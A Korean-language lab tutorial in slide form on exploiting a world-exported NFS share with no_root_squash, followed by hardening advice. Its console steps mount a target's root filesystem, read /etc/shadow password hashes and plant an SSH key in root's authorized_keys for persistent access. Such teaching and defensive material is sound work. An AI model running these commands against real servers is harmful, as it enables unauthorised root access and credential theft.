1. 아키텍처 개요 (Architecture Overview)

NFS(Network File System, 네트워크 파일 시스템)는 원격지 서버의 디렉터리를 자신의 로컬 시스템처럼 마운트하여 사용하는 프로토콜입니다. 취약한 설정이 존재하는 경우, 공격자는 인증 없이 원격 파일 시스템을 연결하여 루트 권한 상승(Privilege Escalation) 및 데이터 유출을 수행할 수 있습니다.

[도식: NFS 침투 시나리오 아키텍처]

공격자 (Kali Linux)
NFS Client / RPC Info
Port 111, 2049
타겟 (Vulnerable Server)
NFS Server / Portmapper

3. 타겟 서비스 탐색 (Target Reconnaissance)

STEP 01

Nmap 포트 스캔 (Port Scanning)

RPC Bind(111)와 NFS(2049) 포트가 열려 있는지 확인합니다.

Console
$ nmap -p 111,2049 192.168.10.50 # 타겟 IP의 포트 상태 스캔
PORT STATE SERVICE # 포트 번호와 상태, 서비스 명칭
111/tcp open rpcbind # RPC 서비스가 활성화되어 있음
2049/tcp open nfs # NFS 서비스가 외부 접속을 대기 중임
PAGE 04

4. RPC 서비스 열거 (Service Enumeration)

STEP 02

rpcinfo를 이용한 상세 분석

타겟에서 구동 중인 모든 RPC 프로그램 정보를 획득합니다.

Console
$ rpcinfo -p 192.168.10.50 # RPC 포트 매퍼 정보 조회
program vers proto port service
100000 4 tcp 111 portmapper # 포트 매퍼 버전 4 확인
100003 3 tcp 2049 nfs # NFS 버전 3 활성화 확인
100005 1 udp 42807 mountd # 마운트 서비스 구동 확인
PAGE 05

5. 취약한 공유 폴더 식별 (Export List)

STEP 03

showmount를 통한 노출 점검

익스포트(Export, 외부 공유 리스트) 설정을 확인합니다.

Console
$ showmount -e 192.168.10.50 # 원격지의 공유 목록 요청
Export list for 192.168.10.50:
/ * # 주의! 모든 호스트(*)에 루트(/) 폴더가 공개됨

6. 로컬 마운트 포인트 생성 (Preparation)

STEP 04

디렉터리 준비

타겟의 파일 시스템을 연결할 빈 폴더를 공격자 PC에 만듭니다.

Console
$ sudo mkdir -p /tmp/target_fs # 마운트용 경로 생성
# 오류 메시지가 없다면 정상적으로 생성되었습니다.
PAGE 07

7. 강제 마운트 수행 (Exploitation)

STEP 05

NFS 마운트 시도

공개된 루트(/) 경로를 공격자의 폴더에 연결합니다.

Console
$ sudo mount -t nfs 192.168.10.50:/ /tmp/target_fs -nolock # 타겟 /를 로컬로 마운트
$ df -h | grep target_fs # 마운트 성공 여부 확인
192.168.10.50:/ 8.0G 2.5G 5.5G 32% /tmp/target_fs # 성공! 원격지가 연결됨
PAGE 08

8. 파일 시스템 내부 탐색 (Post-Exploitation)

STEP 06

내용물 확인

마운트된 폴더의 리스트를 조회하여 타겟 시스템 구조를 봅니다.

Console
$ ls -la /tmp/target_fs # 마운트된 디렉터리 상세 조회
drwxr-xr-x 22 root root 4096 May 20 10:00 . # 타겟 서버의 루트 권한 폴더들
drwxr-xr-x 2 root root 4096 May 20 10:00 bin # 실행 파일 폴더
drwxr-xr-x 3 root root 4096 May 20 10:00 etc # 설정 파일 폴더 (주요 공격 대상)
drwxr-xr-x 2 root root 4096 May 20 10:00 root # 루트 홈 디렉터리 (접근 가능 여부 확인 필요)

9. 민감 정보 탈취 (Sensitive Data Access)

STEP 07

계정 정보 탈취

타겟 서버의 계정 및 암호화된 비밀번호 파일을 읽습니다.

Console
$ cat /tmp/target_fs/etc/passwd # 계정 정보 확인
root:x:0:0:root:/root:/bin/bash # 루트 계정 확인
$ sudo cat /tmp/target_fs/etc/shadow # 암호 해시 탈취
root:$1$LgfW...:15621:0:99999:7::: # 치명적! 해시 획득

10. 권한 상승 메커니즘 (Privilege Escalation)

NFS 취약점의 핵심은 no_root_squash 옵션에 있습니다.

ID Mapping (아이디 매핑) 원리

일반적으로 NFS는 클라이언트의 root 권한을 서버 측의 익명 사용자(nobody)로 변환(squash)하지만, no_root_squash가 설정되면 클라이언트의 root는 서버에서도 root로 인정됩니다.

  • - root_squash: Client(root) -> Server(nobody)
  • - no_root_squash: Client(root) -> Server(root)
PAGE 11

11. SSH 키 등록을 통한 백도어 (Persistence)

STEP 08

루트 공개키 삽입

공격자의 SSH 공개키를 타겟의 인증 목록에 추가하여 영구적 접근권을 확보합니다.

Console
$ ssh-keygen -t rsa # 공격용 키 쌍 생성
$ cat ~/.ssh/id_rsa.pub >> /tmp/target_fs/root/.ssh/authorized_keys # 타겟에 키 복사
$ ssh root@192.168.10.50 # 암호 없이 루트 접속
root@vulnerable-server:~# # 쉘 획득!
PAGE 12

12. 연결 해제 및 흔적 제거 (Cleanup)

실습 완료 후 공격 흔적을 최소화하기 위해 마운트를 해제합니다.

$ cd ~ # 사용 중인 마운트 폴더에서 이동
$ sudo umount /tmp/target_fs # 연결 해제
$ rmdir /tmp/target_fs # 로컬 디렉터리 삭제
PAGE 13

13. 보안 대책: 설정 강화 (Hardening)

/etc/exports 보안 설정

와일드카드(*)를 지양하고 특정 IP로만 제한합니다.
예시: /home 192.168.10.10(rw,sync,root_squash)

root_squash 적용

반드시 root_squash(기본값) 옵션을 사용하여 클라이언트의 루트 권한이 서버 루트로 직결되는 것을 방어해야 합니다.

PAGE 14

14. 보안 대책: 네트워크 제어 (Network Control)

  • TCP Wrapper 사용

    /etc/hosts.allow 및 /etc/hosts.deny 파일을 통해 rpcbind 접근을 제어합니다.

  • NFSv4 및 Kerberos 인증

    단순 IP 기반 인증이 아닌 강력한 사용자 기반 인증(Kerberos)을 도입하여 보안 수준을 격상시킵니다.

PAGE 15

15. 아키텍트 인사이트 (Expert Insight)

"보안의 고리는 가장 약한 부분에서 끊어집니다. NFS 취약점은 복잡한 익스플로잇 코드가 아니라, 한 줄의 잘못된 설정에서 시작됩니다."

시스템 아키텍처 설계 시, 인접성(Adjacency) 기반의 보안 모델은 신뢰받는 내부 망에서도 위험할 수 있습니다.
모든 서비스는 제로 트러스트(Zero Trust) 관점에서 접근 제어가 이루어져야 하며, NFS와 같은 레거시 프로토콜은 반드시 현대적인 인증 계층과 격리된 네트워크 환경에서 운용되어야 함을 이번 실습을 통해 명심하시기 바랍니다.
